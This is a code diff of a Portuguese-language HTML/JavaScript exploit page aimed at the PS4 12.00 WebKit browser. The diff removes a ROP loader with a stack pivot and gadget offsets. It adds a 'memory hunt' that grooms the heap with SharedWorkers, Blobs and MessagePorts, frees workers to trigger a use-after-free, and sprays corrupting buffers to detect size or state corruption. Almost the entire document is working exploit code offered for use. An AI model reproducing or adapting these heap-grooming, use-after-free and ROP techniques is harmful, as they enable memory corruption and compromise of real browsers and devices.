@@ -2,148 +2,175 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 ROP Jailbreak</title>
-   
+    <title>PS4 12.00 Universal Memory Hunt</title>
+    <style>
+        body { background-color: #050505; color: #00ff00; font-family: monospace; text-align: center; padding: 20px; }
+        #log { border: 2px solid #333; width: 95%; height: 500px; margin: 20px auto; padding: 10px; text-align: left; overflow-y: auto; background: #000; font-size: 13px; }
+        button { background-color: #004488; color: white; padding: 15px 30px; font-size: 18px; border: 1px solid #0088ff; cursor: pointer; border-radius: 5px; }
+        .success { color: #00ffff; font-weight: bold; border: 1px solid #00ffff; padding: 5px; }
+        .target-blob { color: #ff00ff; }
+        .target-port { color: #ffff00; }
+    </style>
 </head>
 <body>
 
-    <h1>PS4 12.00 ROP LOADER</h1>
-    <h3>Estratégia: Stack Pivot via xchg rsp, rax</h3>
-    
-    <label>WebKit Base (Chute Hex):</label><br>
-    <input type="text" id="base_addr" value="0x800000000"> 
-    <br><br>
-    
+    <h1>PS4 12.00 - ISOHEAP BREAKER</h1>
+    <h3>Alvos: Blob (Size) | MessagePort (State) | ArrayBuffer</h3>
+    <div id="status">Aguardando início...</div>
     <div id="log"></div>
-    <button onclick="run_rop()">DISPARAR ROP</button>
+    <br>
+    <button onclick="start_hunt()">INICIAR CAÇADA UNIVERSAL</button>
 
     <script>
-        function log(msg) {
-            document.getElementById("log").innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        function log(msg, type="") {
+            var d = document.getElementById("log");
+            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.scrollTop = d.scrollHeight;
         }
 
         // =================================================================
-        // 1. SEUS OFFSETS (Extraídos do seu teste)
+        // 1. O CORRUPTOR
         // =================================================================
-        var OFFSETS = {
-            // WebKit (Para o Pivot)
-            xchg_rsp_rax: 0x3F3E5F0,
-            pop_rdi:      0x4D02F,  // Userland
-            
-            // LibKernel (Para a Syscall)
-            // Precisamos saber a distancia entre WebKit e LibKernel.
-            // Como não sabemos, vamos tentar usar apenas gadgets do WebKit se possível,
-            // ou chutar a base da LibKernel também.
-            
-            // Mas espere! sys_setuid está na LibKernel (0x2F6E0).
-            // A LibKernel costuma estar "perto" do WebKit na memória.
-            // Vamos tentar usar apenas o POP_RDI do WebKit para chamar um endereço fictício por enquanto
-            // para testar o controle da stack.
-        };
-
-        // =================================================================
-        // 2. CONSTRUÇÃO DA ROP CHAIN
-        // =================================================================
-        function build_rop_payload(webkit_base_str) {
-            // Converter string hex para BigInt
-            var wk_base = BigInt(webkit_base_str);
-            
-            // Gadgets Reais (Calculados)
-            var G_PIVOT   = wk_base + BigInt(OFFSETS.xchg_rsp_rax);
-            var G_POP_RDI = wk_base + BigInt(OFFSETS.pop_rdi);
-            
+        function build_corruptor() {
             var size = 0x400; 
             var buffer = new Uint32Array(size / 4);
-            var view = new DataView(buffer.buffer);
-
-            // --- LAYOUT DO OBJETO FALSO ---
-            // Quando o kernel chama a função virtual, ele faz: call [rax + offset]
-            // RAX aponta para o inicio do buffer.
-            // Vamos encher o buffer com o endereço do PIVOT.
-            // Assim, call [rax] vira call G_PIVOT.
-            
-            // 1. Preencher Fake Vtable com o endereço do Pivot
-            for(var i=0; i < 32; i+=2) { // Primeiros bytes
-                set64(view, i*4, G_PIVOT); 
-            }
-
-            // --- A STACK FAKE (ROP CHAIN) ---
-            // Assim que xchg rsp, rax rodar, o RSP vai apontar para o início deste buffer.
-            // A próxima instrução é RET. Ela vai pegar o primeiro valor da stack (Offset 0).
-            // Offset 0 já tem G_PIVOT. Retornar para o Pivot cria um loop infinito?
-            // Não, precisamos que a Stack comece LOGO DEPOIS do comando que chamou.
-            
-            // Como xchg troca RSP e RAX, e RAX é o topo do objeto...
-            // O próximo POP vai ler do offset 0.
-            
-            // ROP CHAIN DE TESTE (INFINITE LOOP / CRASH CONTROLADO)
-            // Queremos provar que controlamos a execução.
-            var idx = 0;
-            
-            // Endereço 0: O Pivot é chamado. RSP vira Endereço 0.
-            // RET: Pula para o que estiver no Endereço 0.
-            // Se deixarmos G_PIVOT aqui, ele vai pivotar de novo e de novo (Loop).
-            // ISSO É BOM! Se o console travar (Freeze) em vez de desligar, o ROP funcionou!
-            
-            set64(view, 0, G_PIVOT); // Gadget 1 (Executado pelo RET do Pivot)
-            set64(view, 8, G_PIVOT); // Gadget 2
-            set64(view, 16, G_PIVOT);
-            
-            // Se isso funcionar, o console congela.
-            
+            // Padrão agressivo para sobrescrever tamanhos/ponteiros
+            // 0x40000000 = 1GB (Para corromper .size ou .byteLength)
+            buffer.fill(0x40000000); 
             return buffer;
         }
 
-        function set64(view, offset, bigint_val) {
-            view.setBigUint64(offset, bigint_val, true); // Little Endian
-        }
-
         // =================================================================
-        // 3. EXECUÇÃO
+        // 2. SANDUÍCHE MISTO (A, B, C)
         // =================================================================
-        var workers = [];
+        var sandwich = [];
+        var targets_blob = [];
+        var targets_port = [];
 
-        async function run_rop() {
-            var base_val = document.getElementById("base_addr").value;
-            log(`Construindo ROP para Base: ${base_val}`);
+        async function start_hunt() {
+            if(!window.SharedWorker) return log("Navegador incompatível.");
             
-            var payload = build_rop_payload(base_val);
+            var payload = build_corruptor();
+            log("Corruptor (0x400) construído.", "success");
 
-            // GROOMING (400)
-            for(let i=0; i<400; i++) {
+            // FASE 1: BASE GROOMING
+            log("Fase 1: Grooming (0-380)...");
+            for(let i=0; i < 380; i++) {
                 try {
-                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
+                    let w = new SharedWorker("data:text/javascript,1", "bg"+i);
                     w.port.start();
-                    workers.push(w);
+                    sandwich.push({type: 'padding', w: w});
                 } catch(e){}
             }
 
-            // TRIGGER (404)
+            // FASE 2: SANDUÍCHE COMPLEXO (380-404)
+            // Vamos alternar: [Worker] [Blob] [Worker] [Port] [Worker]
+            // Para tentar acertar qualquer vizinho compatível na zona IsoHeap.
+            
+            log("Fase 2: Construindo Armadilha Mista (380-404)...");
+            
             var p_count = 0;
-            var it = setInterval(() => {
-                if(p_count >= 4) {
-                    clearInterval(it);
+            // O limite seguro é 404. Temos ~24 slots para brincar.
+            var limit = 20; 
+
+            var interval = setInterval(() => {
+                if (p_count >= limit) {
+                    clearInterval(interval);
+                    trigger_universal(payload); 
+                    return;
+                }
+
+                try {
+                    // 1. Cria Worker (O Explosivo)
+                    var id = 381 + p_count;
+                    var w = new SharedWorker("data:text/javascript,1", "victim_"+id);
+                    w.port.start();
                     
-                    log("!!! DISPARANDO ROP !!!");
-                    var v = workers.pop();
-                    v.port.close();
+                    // 2. Cria Vizinho BLOB (Alvo A)
+                    // Blob de tamanho conhecido (1024 bytes)
+                    var blob_content = new Uint8Array(1024);
+                    blob_content.fill(0x41);
+                    var b = new Blob([blob_content]);
+                    targets_blob.push({id: id, blob: b});
+
+                    // 3. Cria Vizinho MESSAGEPORT (Alvo B)
+                    var mc = new MessageChannel();
+                    targets_port.push({id: id, port: mc.port1});
+
+                    // Guarda referência do worker para explodir depois
+                    sandwich.push({type: 'victim', w: w, id: id});
                     
-                    var spray = [];
-                    for(var k=0; k<5000; k++) {
-                        spray.push(new Uint32Array(payload));
-                    }
-                    
-                    try { v.port.postMessage("ROP"); } catch(e){}
-                    
-                    log("Se o console CONGELAR (imagem parada) e NÃO desligar, anote o endereço Base!");
+                    log(`Conjunto ${id} alocado (Worker + Blob + Port).`);
+                } catch(e) { log("Erro: " + e); }
+                
+                p_count++;
+            }, 150);
+        }
+
+        function trigger_universal(payload) {
+            log("!!! ZONA CRÍTICA. DISPARANDO UAF !!!", "warn");
+            document.getElementById("status").innerText = "ATACANDO...";
+
+            // Atacamos de trás para frente (os mais recentes primeiro)
+            var attempts = 0;
+            var attack_int = setInterval(() => {
+                // Parar se acabarem os targets ou após tentativas seguras
+                var victim_data = sandwich.pop();
+                while(victim_data && victim_data.type !== 'victim') {
+                    victim_data = sandwich.pop(); // Pula os paddings
+                }
+
+                if (!victim_data || attempts >= 8) {
+                    clearInterval(attack_int);
+                    log("Ataque finalizado. Se não houve sucesso, o isolamento é total.");
                     return;
                 }
                 
-                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
-                w.port.start();
-                workers.push(w);
-                p_count++;
-            }, 150);
+                log(`Explodindo Worker ${victim_data.id}...`);
+                
+                // 1. FREE
+                victim_data.w.port.close();
+                victim_data.w = null;
+
+                // 2. SPRAY MASSIVO (Tenta preencher o buraco)
+                var spray = [];
+                for(let k=0; k<2000; k++) {
+                    spray.push(new Uint32Array(payload));
+                }
+
+                // 3. VERIFICAÇÃO: ALGUÉM FOI ATINGIDO?
+                
+                // Checa BLOBS (Procura mudança de tamanho)
+                // Se um Blob de 1024 bytes virar 1GB, TEMOS LEAK!
+                var t_blob = targets_blob.find(t => t.id === victim_data.id);
+                if (t_blob) {
+                    if (t_blob.blob.size !== 1024) {
+                        log("!!! SUCESSO NO BLOB !!!", "success target-blob");
+                        log(`Blob ${t_blob.id} corrompido!`, "success");
+                        log(`Tamanho Original: 1024`, "info");
+                        log(`Novo Tamanho: ${t_blob.blob.size}`, "success");
+                        alert("JAILBREAK: Blob Corruption Confirmada!");
+                        clearInterval(attack_int);
+                        return;
+                    }
+                }
+
+                // Checa PORTAS (Tenta enviar mensagem)
+                var t_port = targets_port.find(t => t.id === victim_data.id);
+                if (t_port) {
+                    try {
+                        t_port.port.postMessage("ping");
+                    } catch(e) {
+                        log(`!!! SUCESSO NA PORTA ${t_port.id} !!!`, "success target-port");
+                        log("Erro detectado: " + e, "success");
+                        alert("JAILBREAK: Port Corruption Confirmada!");
+                        clearInterval(attack_int);
+                        return;
+                    }
+                }
+
+                attempts++;
+            }, 250);
         }
     </script>
 </body>
